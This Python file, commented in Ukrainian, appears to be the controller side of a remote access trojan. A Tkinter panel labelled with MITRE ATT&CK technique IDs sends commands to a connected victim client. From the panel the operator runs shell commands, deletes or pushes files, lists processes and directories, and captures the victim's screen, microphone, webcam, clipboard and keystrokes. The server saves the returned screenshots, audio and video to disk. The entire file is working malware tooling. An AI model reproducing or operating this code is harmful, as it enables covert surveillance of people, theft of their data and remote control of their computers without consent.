#server
import socket
import tkinter as tk
from tkinter import messagebox, simpledialog
import time

server = socket.socket()

server.bind(("127.0.0.1", 100)) # створення серверу на ip адресі
print("Server is ready!")
server.listen(1) # очікування підключення
client, addr = server.accept() # створення зв'язку
message = client.recv(1024).decode() # Отримання повідомлення
print(message)

def get_data():
    global client
    
    size = int(client.recv(1024).decode())
    data = []
    sent = 0
    while sent < size:
        message = client.recv(1024)
        data.append(message)
        sent += 1024        

    text = ""
    for elem in data:
        text += str(elem.decode())
    messagebox.showinfo("Data", text)

def T1105():
    global client
    command = "T1105"
    args = simpledialog.askstring("Input", "Enter path: ", parent=window)
    client.send(str([command, args]).encode())
    time.sleep(1)
    file = open(args, "rb")
    data = file.read()
    size = len(data)
    #print(size)

    client.send(str(size).encode())
    sent = 0
    while sent < size:
        client.send(data[sent:sent+1024])
        sent += 1024
    #print("end")

def T1113():
    global client
    command = "T1113"
    args = ""
    client.send(str([command, args]).encode())
    file = open("screen.png","wb")
    size = int(client.recv(1024).decode())
    #print(size)
    sent = 0
    while sent < size:
        data = client.recv(1024)
        file.write(data)
        sent += 1024
    file.close()
    messagebox.showinfo("Data", "Screen was created")

def T1123():
    global client
    command = "T1123"
    args = ""
    client.send(str([command, args]).encode())
    file = open("audio.wav","wb")
    size = int(client.recv(1024).decode())
    #print(size)
    sent = 0
    while sent < size:
        data = client.recv(1024)
        file.write(data)
        sent += 1024
    file.close()
    messagebox.showinfo("Data", "Audio was created")

def T1125():
    global client
    command = "T1125"
    args = ""
    client.send(str([command, args]).encode())
    file = open("video.avi","wb")
    size = int(client.recv(1024).decode())
    #print(size)
    sent = 0
    while sent < size:
        data = client.recv(1024)
        file.write(data)
        sent += 1024
    file.close()
    messagebox.showinfo("Data", "Video was created")

def T1082():  #SysInfoDisc
    command = "T1082"
    args = ""
    client.send(str([command, args]).encode())
    get_data()

def T1059():  #Command-Line Interface
    command = "T1059"
    args = simpledialog.askstring("Input", "Enter command: ", parent=window)
    client.send(str([command, args]).encode())
    get_data()

def T1083(): #File and Directory Discovery
    command = "T1083"
    args = simpledialog.askstring("Input", "Enter path: ", parent=window)
    client.send(str([command, args]).encode())
    get_data()


def T1107(): #File Deletion
    command = "T1107"
    args = simpledialog.askstring("Input", "Enter path: ", parent=window)
    client.send(str([command, args]).encode())
    get_data()

def T1115(): #Clipboard Data 
    command = "T1115"
    args = ""
    client.send(str([command, args]).encode())
    get_data()

def T1056(): 
    command = "T1056"
    args = ""
    client.send(str([command, args]).encode())
    get_data()

def T1057():
    command = "T1057"
    args = ""
    client.send(str([command, args]).encode())
    get_data()




window = tk.Tk()
window.geometry("500x400")
T1082 = tk.Button(window, text="T1082(): SysInfoDisc", command=T1082)
T1059 = tk.Button(window, text="T1059(): Command-Line Interface", command=T1059)
T1083 = tk.Button(window, text="T1083(): File and Directory Discovery", command=T1083)
T1105 = tk.Button(window, text="T1105(): Remote File Copy", command=T1105)
T1107 = tk.Button(window, text="T1107(): File Deletion", command=T1107)
T1113 = tk.Button(window, text="T1113(): Screen Capture", command=T1113)
T1115 = tk.Button(window, text="T1115(): Clipboard Data", command=T1115)
T1123 = tk.Button(window, text="T1123(): Audio Capture", command=T1123)
T1125 = tk.Button(window, text="T1125(): Video Capture", command=T1125)
T1056 = tk.Button(window, text="T1056(): Input Capture", command=T1056)
T1057 = tk.Button(window, text="T1057(): Process Discovery", command=T1057)

T1082.pack(pady=7, fill=tk.X)
T1059.pack(pady=7, fill=tk.X)
T1083.pack(pady=7, fill=tk.X)
T1105.pack(pady=7, fill=tk.X)
T1107.pack(pady=7, fill=tk.X)
T1113.pack(pady=7, fill=tk.X)
T1115.pack(pady=7, fill=tk.X)
T1123.pack(pady=7, fill=tk.X)
T1125.pack(pady=7, fill=tk.X)
T1056.pack(pady=7, fill=tk.X)
T1057.pack(pady=7, fill=tk.X)

window.mainloop()
print("Finish")